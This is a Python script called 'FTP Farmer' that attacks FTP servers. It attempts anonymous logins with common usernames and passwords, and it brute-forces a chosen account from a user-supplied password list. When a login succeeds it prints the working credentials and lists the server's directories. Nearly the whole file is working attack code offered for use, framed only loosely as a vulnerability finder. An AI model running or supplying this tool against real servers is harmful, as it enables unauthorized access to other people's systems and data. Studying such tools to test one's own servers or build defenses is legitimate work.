# Modules
import json
from ftplib import FTP
from os import system, name
from sys import argv
from requests import get
from colorama import Fore, init
init(autoreset="true")

# Docstring.
"""
FTP Farmer is an useful tool to find out FTP Vulnerablities.
*Choose "-a" for Anonymous login.*
*Choose "-b" for Brute Force attack.*
Created by Mehran SeifAliNia.
"""
# Clear the screen
def cls():
    if  name == "nt":
        system("cls")
    else:
        system("clear")

# get ip
def ip():
    site = "https://ipinfo.io/json"
    response = get(site, verify = True)
    data = response.json()
    return data["ip"]

# Show banner.
def banner():
    print("""
                     /_\   /_\   /_\                                
                    // \\ // \\ // \\                               
                   |/   \|/   \|/   \|                              
  __                   .-'''-.        .-'''-.                  __   
 /\ \             _   '   _    \     '   _    \ _             / /\  
'  \ \          .' )/   /` '.   \  /   /` '.   ( `.          / /  ' 
 \  \ \        / .'.   |     \  ' .   |     \  ''. \        / /  /  
  \  \ \      / /  |   '      |  '|   '      |  ' \ \      / /  /   
   \  \ \    / /   \    \     / / \    \     / /   \ \    / /  /    
    \  \ \  . '     `.   ` ..' /   `.   ` ..' /     ' .  / /  /     
     \  \ \ | |        '-...-'`       '-...-'`      | | / /  /      
      \  \ \' '                                     ' '/ /  /       
       \  \ \\ \ ________________                  / // /  /        
        \  \_\\ \________________|                / //_/  /         
         \ / / \ '.                             .' / \ \ /          
          '-'   '._)   Lets go                 (_.'   --'           
                _   _   _            _   _   _                      
              .' ).' ).' )          ( `.( `.( `.      :)              
             / .'/ .'/ .'            '. \'. \'. \                   
            / / / / / /                \ \ \ \ \ \                  
           / / / / / /        FTP       \ \ \ \ \ \                 
          . ' . ' . '        Farmer      ' . ' . ' .                
          | | | | | |                    | | | | | |                
          ' ' ' ' ' '    MehranTheSanea  ' ' ' ' ' '                
           \ \ \ \ \ \                  / / / / / /                 
            \ \ \ \ \ \                / / / / / /                  
             \ '.\ '.\ '.            .' /.' /.' /                   
              '._)'._)'._)          (_.'(_.'(_.'                    
    """)

# Login
def loginTry(target, user, password):
    connection = FTP(target)
    status = connection.login(user, password)
    if "230" in status:
        cls()
        print(f"{Fore.LIGHTGREEN_EX}Logged in successfully!\n{Fore.LIGHTGREEN_EX}Username: {Fore.RED}{user}\n{Fore.LIGHTGREEN_EX}password: {Fore.RED}{password}")
        print(f"{Fore.LIGHTGREEN_EX}Please wait to read {Fore.RED}'{target}' {Fore.LIGHTGREEN_EX}diractories.")
        connection.dir()
        connection.quit()
        return True
    elif "password error" in status:
        print(f"{Fore.RED}User or Pass invalid!")
    else:
        print(f"{Fore.RED}Failed to login!")

# Anonymous login
def anonymousLogin(target, anonymous_password_list):
    j = 0
    for i in range(len(anonymous_password_list)):
        for uname in ["anonymous", "ftp"]:
            try:
                j += 1
                print(f"{Fore.LIGHTGREEN_EX}try {Fore.RED}{j}{Fore.LIGHTGREEN_EX}...")
                loginTry(target, uname, anonymous_password_list[i])
            except:
                pass
    print(f"{Fore.LIGHTGREEN_EX}'{target}' {Fore.RED}is not vulnerable!")

# Brute force
def bruteForce(target, user, passwords):
    password_list = []
    with open(passwords) as ps:
        passwd = ps.readline()
        print(f"{Fore.LIGHTGREEN_EX}Read passwords.......\n")
        while passwd:
            password_list.append(passwd)
            passwd = ps.readline()
        print("\n")
    for x in password_list:
        try:
            print(f"{Fore.LIGHTGREEN_EX}Trying {Fore.RED}'{x.strip()}'{Fore.LIGHTGREEN_EX}as password...")
            if (loginTry(target, user, x.strip())):
                break
        except:
            continue


# Main
cls()
banner()
if len(argv) <= 1 or len(argv) > 3:
    print(f"{Fore.RED}[*]Usage: {Fore.LIGHTGREEN_EX}{argv} -a/-b\n\n  {Fore.RED}Help:\n\t{Fore.LIGHTGREEN_EX}-a\tAnonymous Login test.\n\t-b\tBrute Force attack.\n")
else:
    target = input(f"{Fore.LIGHTGREEN_EX}Please enter target(without 'http(s)://'): {Fore.RED}")
    if argv[1] == "-a":
        anonymous_password_list = ["anonymous", f"anonymous@{ip()}"]
        anonymousLogin(target, anonymous_password_list)
    elif argv[1] == "-b":
        user = input(f"{Fore.LIGHTGREEN_EX}Please enter your username to test: {Fore.RED}")
        passwords = input(f"{Fore.LIGHTGREEN_EX}Enter your Passlist: {Fore.RED}")
        bruteForce(target, user, passwords)
    else:
        pass
